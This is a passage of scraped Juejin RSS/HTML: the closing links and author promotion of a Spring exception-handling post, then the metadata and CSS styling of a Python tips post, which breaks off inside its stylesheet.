<li>Spring Framework Reference – Exception Handling <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.spring.io%2Fspring-framework%2Freference%2Fweb%2Fwebmvc%2Fmvc-controller%2Fann-exceptionhandler.html" target="_blank" title="https://docs.spring.io/spring-framework/reference/web/webmvc/mvc-controller/ann-exceptionhandler.html" ref="nofollow noopener noreferrer">docs.spring.io/spring-fram…</a></li>
<li>Spring MVC 源码（DispatcherServlet） <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fspring-projects%2Fspring-framework" target="_blank" title="https://github.com/spring-projects/spring-framework" ref="nofollow noopener noreferrer">github.com/spring-proj…</a></li>
</ul>
<hr/>
<h3 data-id="heading-22">结束语</h3>
<p>​</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a9188b5cad54e3181f3a40cac5b1bfb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUWl1bmVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767861603&amp;x-signature=%2BNmajvzG5DmSxDbsD8iAdAcLMZc%3D" alt="image-20251011155556997" loading="lazy"/></p>
<p><a href="https://juejin.cn/user/1942157160101860" target="_blank" title="https://juejin.cn/user/1942157160101860">掘金点击访问Qiuner</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fqq_61654952%3Fspm%3D1000.2115.3001.5343" target="_blank" title="https://blog.csdn.net/qq_61654952?spm=1000.2115.3001.5343" ref="nofollow noopener noreferrer">CSDN点击访问Qiuner</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fqq_61654952%3Fspm%3D1000.2115.3001.5343" target="_blank" title="https://blog.csdn.net/qq_61654952?spm=1000.2115.3001.5343" ref="nofollow noopener noreferrer">GitHub点击访问Qiuner</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fqq_61654952%3Fspm%3D1000.2115.3001.5343" target="_blank" title="https://blog.csdn.net/qq_61654952?spm=1000.2115.3001.5343" ref="nofollow noopener noreferrer">Gitee点击访问Qiuner</a></p>

























<table><thead><tr><th>专栏</th><th>简介</th></tr></thead><tbody><tr><td>📊 <a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fqq_61654952%2Fcategory_12632467.html%3Fspm%3D1001.2014.3001.5482" target="_blank" title="https://blog.csdn.net/qq_61654952/category_12632467.html?spm=1001.2014.3001.5482" ref="nofollow noopener noreferrer">一图读懂系列</a></td><td>图文并茂，轻松理解复杂概念</td></tr><tr><td>📝 <a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fqq_61654952%2Fcategory_12634729.html%3Fspm%3D1001.2014.3001.5482" target="_blank" title="https://blog.csdn.net/qq_61654952/category_12634729.html?spm=1001.2014.3001.5482" ref="nofollow noopener noreferrer">一文读懂系列</a></td><td>深入浅出，全面解析技术要点</td></tr><tr><td>🌟<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fqq_61654952%2Fcategory_12714627.html%3Fspm%3D1001.2014.3001.5482" target="_blank" title="https://blog.csdn.net/qq_61654952/category_12714627.html?spm=1001.2014.3001.5482" ref="nofollow noopener noreferrer">持续更新</a></td><td>保持学习，不断进步</td></tr><tr><td>🎯 <a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fqq_61654952%2Fcategory_12649117.html%3Fspm%3D1001.2014.3001.5482" target="_blank" title="https://blog.csdn.net/qq_61654952/category_12649117.html?spm=1001.2014.3001.5482" ref="nofollow noopener noreferrer">人生经验</a></td><td>经验分享，共同成长</td></tr></tbody></table>
<blockquote>
<p>你好,我是Qiuner. <em><strong>为帮助别人少走弯路而写博客</strong></em></p>
<p>如果本篇文章帮到了你 不妨点个<strong>赞</strong>吧~ 我会很高兴的 😄 (^ ~ ^) 。想看更多 那就点个<strong>关注</strong>吧 我会尽力带来有趣的内容 😎。</p>
<p>代码都在Github或Gitee上，如有需要可以去上面自行下载。记得给我点星星哦😍</p>
<p>如果你遇到了问题，自己没法解决，可以去我掘金评论区问。CSDN评论区和私信消息看不完 掘金消息少一点.</p>
</blockquote>

































<table><thead><tr><th><strong>上一篇推荐</strong></th><th><strong>链接</strong></th></tr></thead><tbody><tr><td>Java程序员快又扎实的学习路线</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fqq_61654952%2Farticle%2Fdetails%2F141544404%3Fspm%3D1001.2014.3001.5501" target="_blank" title="https://blog.csdn.net/qq_61654952/article/details/141544404?spm=1001.2014.3001.5501" ref="nofollow noopener noreferrer">点击该处自动跳转查看哦</a></td></tr><tr><td>一文读懂 AI</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fqq_61654952%2Farticle%2Fdetails%2F147201025%3Fspm%3D1001.2014.3001.5501" target="_blank" title="https://blog.csdn.net/qq_61654952/article/details/147201025?spm=1001.2014.3001.5501" ref="nofollow noopener noreferrer">点击该处自动跳转查看哦</a></td></tr><tr><td>一文读懂 服务器</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fqq_61654952%2Farticle%2Fdetails%2F140839876%3Fspm%3D1001.2014.3001.5501" target="_blank" title="https://blog.csdn.net/qq_61654952/article/details/140839876?spm=1001.2014.3001.5501" ref="nofollow noopener noreferrer">点击该处自动跳转查看哦</a></td></tr><tr><td>2024年创作回顾</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fqq_61654952%2Farticle%2Fdetails%2F145316689%3Fspm%3D1001.2014.3001.5501" target="_blank" title="https://blog.csdn.net/qq_61654952/article/details/145316689?spm=1001.2014.3001.5501" ref="nofollow noopener noreferrer">点击该处自动跳转查看哦</a></td></tr><tr><td>一文读懂 ESLint配置</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fqq_61654952%2Farticle%2Fdetails%2F140926398%3Fspm%3D1001.2014.3001.5501" target="_blank" title="https://blog.csdn.net/qq_61654952/article/details/140926398?spm=1001.2014.3001.5501" ref="nofollow noopener noreferrer">点击该处自动跳转查看哦</a></td></tr><tr><td>老鸟如何追求快捷操作电脑</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fqq_61654952%2Farticle%2Fdetails%2F141133815%3Fspm%3D1001.2014.3001.5501" target="_blank" title="https://blog.csdn.net/qq_61654952/article/details/141133815?spm=1001.2014.3001.5501" ref="nofollow noopener noreferrer">点击该处自动跳转查看哦</a></td></tr></tbody></table>





















<table><thead><tr><th>未来会写什么文章？</th><th><strong>预告链接</strong></th></tr></thead><tbody><tr><td>一文读懂 XX？</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fqq_61654952%2Farticle%2Fdetails%2F147201025%3Fspm%3D1001.2014.3001.5501" target="_blank" title="https://blog.csdn.net/qq_61654952/article/details/147201025?spm=1001.2014.3001.5501" ref="nofollow noopener noreferrer">点击该处自动跳转查看哦</a></td></tr><tr><td>2025年终总结</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fqq_61654952%2Farticle%2Fdetails%2F147201025%3Fspm%3D1001.2014.3001.5501" target="_blank" title="https://blog.csdn.net/qq_61654952/article/details/147201025?spm=1001.2014.3001.5501" ref="nofollow noopener noreferrer">点击该处自动跳转查看哦</a></td></tr><tr><td>一图读懂 XX？</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fqq_61654952%2Farticle%2Fdetails%2F147201025%3Fspm%3D1001.2014.3001.5501" target="_blank" title="https://blog.csdn.net/qq_61654952/article/details/147201025?spm=1001.2014.3001.5501" ref="nofollow noopener noreferrer">点击该处自动跳转查看哦</a></td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[救命！Python 这些基础操作居然能省一半工作量]]></title>    <link>https://juejin.cn/post/7589907831198875674</link>    <guid>https://juejin.cn/post/7589907831198875674</guid>    <pubDate>2026-01-01T06:48:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589907831198875674" data-draft-id="7589159665839587371" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="救命！Python 这些基础操作居然能省一半工作量"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-01-01T06:48:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AAA简单玩转程序设计"/> <meta itemprop="url" content="https://juejin.cn/user/4294056357689099"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            救命！Python 这些基础操作居然能省一半工作量
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4294056357689099/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AAA简单玩转程序设计
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T06:48:52.000Z" title="Thu Jan 01 2026 06:48:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 